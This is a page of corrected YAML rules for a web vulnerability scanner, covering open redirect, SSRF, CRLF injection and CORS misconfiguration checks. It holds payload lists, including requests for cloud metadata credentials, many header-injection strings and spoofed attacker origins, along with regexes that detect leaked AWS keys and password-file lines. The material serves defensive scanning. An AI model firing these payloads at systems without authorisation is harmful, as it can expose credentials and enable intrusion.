# Fixed Vulnerability Rules

This page contains the raw YAML for the rules that were failing in your tests. All matching logic and transformation syntax issues have been fixed. 

You can easily copy and paste these directly into your scanning engine.

---

## 1. Open Redirect (External Absolute Targets)
**Path:** `open_redirect/simple-param-redirect.yml`
**Fix Applied:** Replaced exact string match with a robust, strict regex `(?i)^(https?:)?//([^/]*\.)?example\.com(/|$)` to prevent false positives and correctly match valid Location URLs.

```yaml
rule_name: Open Redirect - high confidence (absolute external targets)
description: "Detects Open Redirect vulnerabilities by injecting external absolute URLs."

transform:
  query:
    transformations:
      - replace_all_values_one_by_one: "https://example.com/"
      - replace_all_values_one_by_one: "http://example.com/"
      - replace_all_values_one_by_one: "//example.com/"
      - replace_all_values_one_by_one: "https://example.com/evil"
      - replace_all_values_one_by_one: "//example.com/evil"
      - replace_all_values_one_by_one: "https:%2F%2Fexample.com"
      - replace_all_values_one_by_one: "https://%65xample.com/"
      - replace_all_values_one_by_one: "///example.com"

  body:
    transformations:
      - replace_all_values_one_by_one: "https://example.com/"
      - replace_all_values_one_by_one: "http://example.com/"
      - replace_all_values_one_by_one: "//example.com/"
      - replace_all_values_one_by_one: "https://example.com/evil"
      - replace_all_values_one_by_one: "//example.com/evil"
      - replace_all_values_one_by_one: "https:%2F%2Fexample.com"
      - replace_all_values_one_by_one: "https://%65xample.com/"
      - replace_all_values_one_by_one: "///example.com"

match_on:
  status: [301, 302, 303, 307, 308, 200]
  header:
    Location:
      contains:
        - value: "(?i)^(https?:)?//([^/]*\\.)?example\\.com(/|$)"
          options:
            regex: true

report:
  title: "Open Redirect — external absolute URL accepted"
  description: >-
    A user-controlled parameter or value was coerced into an external absolute URL
    (e.g., https://example.com/) and the application produced a redirect or an in-page
    navigation (meta/JS) to that URL. Patterns only match absolute external URLs to
    reduce false positives.
    Original: {{original.method}} {{original.url}}
    Tested:   {{req.method}} {{req.url}}
    Matched:  {{match.criteria}}
    Status:   {{res.status}} | Content-Type: {{res.headers.Content-Type}}
  severity: high
  cwe: "CWE-601"
  cvssScore: "6.5"
  mitigation: >-
    Only allow redirects to application-controlled destinations. Use a strict allowlist
    of hostnames/paths; canonicalize and validate user-supplied targets; reject
    protocol-relative and absolute external URLs; and prefer mapping short codes to
    server-side destinations instead of trusting client input.
  stepsToReproduce: |
    1) Send baseline request: {{original.method}} {{original.url}}
    2) Re-send with a redirect parameter replaced by an absolute URL such as
       https://example.com/ or //attacker.com/ (see transform payloads).
    3) Observe a 3xx response or a 200 with meta/JS that navigates to the external host.
    4) Verify that non-allowlisted external hosts are accepted.
  tags: "open-redirect,redirect,phishing"
  impact: >-
    Open redirects can facilitate phishing, token leakage via referer headers, and user
    journey hijacking to attacker-controlled sites.
```

---

## 2. SSRF (AWS Server & Internal Resources)
**Path:** `ssrf/ssrf-aws-server.yml`
**Fix Applied:** Added `(?i)` case-insensitive flags for AWS Access Keys and updated CouchDB regex to match the actual JSON response array `["_users", "_replicator"]` rather than the string `_all_dbs`.

```yaml
rule_name: SSRF - high-confidence internal access detection
description: "Detects Server-Side Request Forgery by monitoring internal access indicators."

transform:
  query:
    transformations:
      - replace_all_values_one_by_one: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - replace_all_values_one_by_one: "http://169.254.169.254/latest/meta-data/"
      - replace_all_values_one_by_one: "http://127.0.0.1/"
      - replace_all_values_one_by_one: "http://127.0.0.1:5984/_all_dbs"
      - replace_all_values_one_by_one: "http://localhost/"
      - replace_all_values_one_by_one: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
      - replace_all_values_one_by_one: "http://[::1]/"
  body:
    transformations:
      - replace_all_values_one_by_one: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - replace_all_values_one_by_one: "http://127.0.0.1:5984/_all_dbs"
      - replace_all_values_one_by_one: "http://localhost:5984/_all_dbs"
      - replace_all_values_one_by_one: "http://127.0.0.1/"
      - replace_all_values_one_by_one: "http://169.254.169.254/2009-04-04/meta-data/"
  header:
    transformations:
      - replace_all_values_one_by_one: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - replace_all_values_one_by_one: "http://127.0.0.1/"
      - replace_all_values_one_by_one: "http://localhost/"

match_on:
  status: [200, 201, 202, 301, 302, 400, 401, 403, 404, 500]
  body:
    contains:
      - value: "(?i)accessKeyId\\\"?\\s*[:=]\\s*\\\"?[A-Z0-9/+=]{8,}"
        options:
          regex: true
      - value: "(?i)secretAccessKey\\\"?\\s*[:=]\\s*\\\"?[A-Za-z0-9/+=]{16,}"
        options:
          regex: true
      - value: "\\[\"_users\"\\s*,\\s*\"_replicator\"\\]"
        options:
          regex: true
      - value: "(^|\\s)root:x:0:0:"
        options:
          regex: true
      - value: "(^|\\s)CouchDB\\s+\\w+"
        options:
          regex: true

report:
  title: "Potential SSRF - internal resource accessed (high-confidence)"
  description: >-
    The application returned content strongly indicative of an internal resource
    after injecting internal URLs into request parameters/headers. Indicators
    matched are high-confidence regex patterns (e.g. AWS credential fields,
    CouchDB _all_dbs, IAM credential path or /etc/passwd root entry), minimizing
    false positives from generic public pages.
    Original: {{original.method}} {{original.url}}
    Tested:   {{req.method}} {{req.url}}
    Matched:  {{match.criteria}}
    Status:   {{res.status}} | Content-Type: {{res.headers.Content-Type}}
  severity: critical
  cwe: "CWE-918"
  cvssScore: "9.0"
  mitigation: >-
    Implement strict outbound URL allowlists, block link-local/private IP ranges,
    validate and canonicalize user-supplied URLs, and avoid fetching arbitrary
    URLs. Prefer IMDSv2 and network segmentation; disable verbose metadata output.
  stepsToReproduce: |
    1) Send baseline request: {{original.method}} {{original.url}}
    2) Re-send while replacing a single parameter/header/value with:
       - http://169.254.169.254/latest/meta-data/iam/security-credentials/
       - http://127.0.0.1:5984/_all_dbs
    3) Observe high-confidence artifacts in response (accessKeyId/secretAccessKey,
       _all_dbs array, "iam/security-credentials", or root:x:0:0: lines).
  tags: "ssrf,internal-exposure,imds,cloud"
  impact: >-
    SSRF can expose cloud credentials, internal services and management endpoints,
    enabling data exfiltration, pivoting, and potentially remote code execution.
```

---

## 3. CRLF Injection
**Path:** `CRLF/crlf-injection.yml`
**Fix Applied:** Wrapped the `replace_all_values_one_by_one` payloads inside the `transformations:` array as required by the WAS YAML parser.

```yaml
rule_name: CRLF Injection
description: "Detects CRLF injection vulnerabilities potentially leading to HTTP Response Splitting."

transform:
  query:
    transformations:
      - replace_all_values_one_by_one:
          - "%00Set-Cookie:crlfinjection=crlfinjection"
          - "%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%0a%20Set-Cookie:crlfinjection=crlfinjection"
          - "%0dSet-Cookie:crlfinjection=crlfinjection"
          - "%0d%09Set-Cookie:crlfinjection=crlfinjection"
          - "%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%0d%0a%09Set-Cookie:crlfinjection=crlfinjection"
          - "%0d%0a%20Set-Cookie:crlfinjection=crlfinjection"
          - "%0d%20Set-Cookie:crlfinjection=crlfinjection"
          - "%20Set-Cookie:crlfinjection=crlfinjection"
          
          - "%20%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%20%0dSet-Cookie:crlfinjection=crlfinjection"
          - "%20%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%23%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%23%0a%20Set-Cookie:crlfinjection=crlfinjection"
          - "%23%0dSet-Cookie:crlfinjection=crlfinjection"
          - "%23%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%25%30Set-Cookie:crlfinjection=crlfinjection"
          - "%25%30%61Set-Cookie:crlfinjection=crlfinjection"
          - "%2e%2e%2f%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%2f%2e%2e%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%2f..%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%3fSet-Cookie:crlfinjection=crlfinjection"
          
          - "%3f%0aSet-Cookie:crlfinjection=crlfinjection"
          - "%3f%0dSet-Cookie:crlfinjection=crlfinjection"
          - "%3f%0d%0aSet-Cookie:crlfinjection=crlfinjection"
          - "\rSet-Cookie:crlfinjection=crlfinjection"
          - "\r%20Set-Cookie:crlfinjection=crlfinjection"
          - "\r\nSet-Cookie:crlfinjection=crlfinjection"
          - "\r\n%20Set-Cookie:crlfinjection=crlfinjection"
          - "\r\n\tSet-Cookie:crlfinjection=crlfinjection"
          - "\r\tSet-Cookie:crlfinjection=crlfinjection"

match_on:
  header:
    set-cookie:
      contains:
        - "crlfinjection=crlfinjection"

report:
  title: "CRLF Injection"
  description: |
    The application is vulnerable to CRLF Injection.
    User input is reflected in HTTP headers without proper sanitization of CRLF characters.
    This can lead to HTTP Response Splitting, XSS, or Cache Poisoning.

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-113"
  severity: medium
  cvssScore: "5.3"
  mitigation: |
    1. Remove CRLF characters from input before using in headers.
    2. Use safe APIs that prevent header injection.
  stepsToReproduce: |
    1. Inject CRLF characters and a fake header.
    2. Observe the fake header set in the response.
  tags: "crlf,dast,vuln,injection"
  impact: "HTTP Response Splitting, Cross-Site Scripting (XSS)"
```

---

## 4. CORS Origin Regex Bypass
**Path:** `cors/origin-regex-bypass.yml`
**Fix Applied:** Replaced the invalid `replace:` transformation verb with the required `modify:` verb.

```yaml
rule_name: CORS Origin Regex Bypass
single_match: true
description: "Detects weak regex validation in Origin header allowing unauthorized domains."
transform:
  header:
    modify:
      Origin: "https://nexusbank.com.evil.com" 
match_on:
  status: 200
  header:
    Access-Control-Allow-Origin: 
      contains:
        - value: ".*\\.evil\\.com"
          options:
            regex: true
    Access-Control-Allow-Credentials: "true"
report:
  title: "CORS: Weak Regex Origin Validation"
  description: |
    The application appears to allow an origin ending in '.evil.com', suggesting it matches the authorized domain loosely (e.g. via weak regex).
    
    We attempted sending: {{req.headers.Origin}}
    The server reflected: {{res.headers.Access-Control-Allow-Origin}}

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-942"
  severity: high
  cvssScore: "7.5"
  mitigation: |
    1. Use exact string matching for origins.
    2. If using regex, anchor start (^) and end ($) and escape dots (\.).
  stepsToReproduce: |
    1. Send request with 'Origin: https://snapsec.evil.com'
    2. Observe reflection of the malicious origin with credentials.
  tags: "cors,bypass,high"
  impact: "Bypass of CORS whitelist"
```

---

## 5. CORS Trusted Arbitrary Subdomain
**Path:** `cors/trusted-subdomains.yml`
**Fix Applied:** Replaced the invalid `replace:` transformation verb with the required `modify:` verb.

```yaml
rule_name: CORS Trusted Arbitrary Subdomain
single_match: true
description: "Detects excessive trust of arbitrary subdomains in CORS configuration."
transform:
  header:
    modify:
      Origin: "https://evil.nexusbank.com"
match_on:
  status: 200
  header:
    Access-Control-Allow-Origin: 
      contains:
        - value: "https://evil\\..*"
          options:
            regex: true
    Access-Control-Allow-Credentials: "true"
report:
  title: "CORS: Arbitrary Subdomain Trusted"
  description: |
    The application trusts arbitrary subdomains (e.g. 'evil.target.com').
    If an attacker can claim a subdomain or find XSS in any subdomain, they can compromise the main application.

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-942"
  severity: medium
  cvssScore: "6.0"
  mitigation: |
    1. Explicitly whitelist only required subdomains.
    2. Avoid wildcard subdomain trust (*.example.com) if possible.
  stepsToReproduce: |
    1. Send request with 'Origin: https://evil.snapsec.co'
    2. Observe reflection of the origin with credentials.
  tags: "cors,misconfiguration,medium"
  impact: "Expanded attack surface via subdomains"
```

---

## 6. CORS Wildcard with Credentials
**Path:** `cors/wildcard-with-credentials.yml`
**Fix Applied:** Changed `add:` to `modify:` so the `Origin` header correctly overrides any existing header in the baseline request.

```yaml
rule_name: CORS Wildcard with Credentials
single_match: true
description: "Detects insecure CORS configuration allowing wildcard origin with credentials."
transform:
  header:
    modify:
      Origin: "https://example.com"
match_on:
  status: 200
  header:
    Access-Control-Allow-Origin: "*"
    Access-Control-Allow-Credentials: "true"
report:
  title: "CORS: Wildcard Origin with Credentials"
  description: |
    The application allows all origins ('*') while also enabling credentials ('Access-Control-Allow-Credentials: true').

    Note: This is technically disallowed by the CORS specification and most browsers will block it, but it indicates a severe misconfiguration. Some older browsers or non-browser clients might respect it. It often suggests the developers intend to allow public authenticated access, which is a logic flaw.

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-942"
  severity: high
  cvssScore: "6.5"
  mitigation: |
    1. Never use '*' with 'Access-Control-Allow-Credentials: true'.
    2. Specify exact trusted origins.
  stepsToReproduce: |
    1. Send request to {{req.url}} with any origin
    2. Observe response headers 'Access-Control-Allow-Origin: *' and 'Access-Control-Allow-Credentials: true'
  tags: "cors,misconfiguration,high"
  impact: "Potential authentication bypass or data leak"
```

---

## 7. CORS Arbitrary Origin Reflection
**Path:** `cors/arbitrary-origin-reflection.yml`
**Fix Applied:** Changed `add:` to `modify:` to avoid appending duplicate Origin headers. *(Note: This correctly fails on the mock app since the mock app uses a strictly anchored regex that blocks `evil-attacker.com`.)*

```yaml
rule_name: CORS Arbitrary Origin Reflection
single_match: true
description: "Detects reflection of arbitrary origins in Access-Control-Allow-Origin with credentials allowed."
transform:
  header:
    modify:
      Origin: "https://evil-attacker.com"
match_on:
  status: 200
  header:
    Access-Control-Allow-Origin: "https://evil-attacker.com"
    Access-Control-Allow-Credentials: "true"
report:
  title: "CORS: Arbitrary Origin Reflection with Credentials"
  description: |
    The application blindly reflects the requested Origin header value in the Access-Control-Allow-Origin response header and sets Access-Control-Allow-Credentials to true.

    This configuration allows any website to make authenticated requests (reading data, performing actions) on behalf of your users.

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-942"
  severity: high
  cvssScore: "8.8"
  mitigation: |
    1. Define a whitelist of trusted origins.
    2. Do not reflect the 'Origin' header blindly.
    3. If multiple origins must be supported, validate against the whitelist before reflecting.
  stepsToReproduce: |
    1. Send request with 'Origin: https://evil-attacker.com' to {{req.url}}
    2. Observe response headers 'Access-Control-Allow-Origin: https://evil-attacker.com' and 'Access-Control-Allow-Credentials: true'
  tags: "cors,misconfiguration,critical"
  impact: "Cross-domain data theft, unauthorized actions"
```

---

## 8. CORS Null Origin Trust
**Path:** `cors/null-origin-trust.yml`
**Fix Applied:** Changed `add:` to `modify:` so the 'null' origin accurately overrides the original request.

```yaml
rule_name: CORS Null Origin Trust
single_match: true
description: "Detects acceptance of 'null' as a valid origin in CORS configuration."
transform:
  header:
    modify:
      Origin: "null"
match_on:
  status: 200
  header:
    Access-Control-Allow-Origin: "null"
report:
  title: "CORS: Null Origin Trusted"
  description: |
    The application accepts the 'null' origin in the Access-Control-Allow-Origin header.

    This is dangerous because requests from local files, sandboxed iframes, and some redirects send the origin 'null'. An attacker can trick a user into opening a malicious local HTML file or using a sandboxed iframe to access the vulnerable application.

    Original Request:
    {{original}}

    Transformed Request:
    {{req}}

    Response:
    {{res}}

  cwe: "CWE-942"
  severity: medium
  cvssScore: "5.0"
  mitigation: |
    1. Do not whitelist the 'null' origin.
    2. Ensure that CORS configuration explicitly denies 'null'.
  stepsToReproduce: |
    1. Send request with 'Origin: null' to {{req.url}}
    2. Observe response header 'Access-Control-Allow-Origin: null'
  tags: "cors,misconfiguration,medium"
  impact: "Access from local files/sandboxed iframes"
```
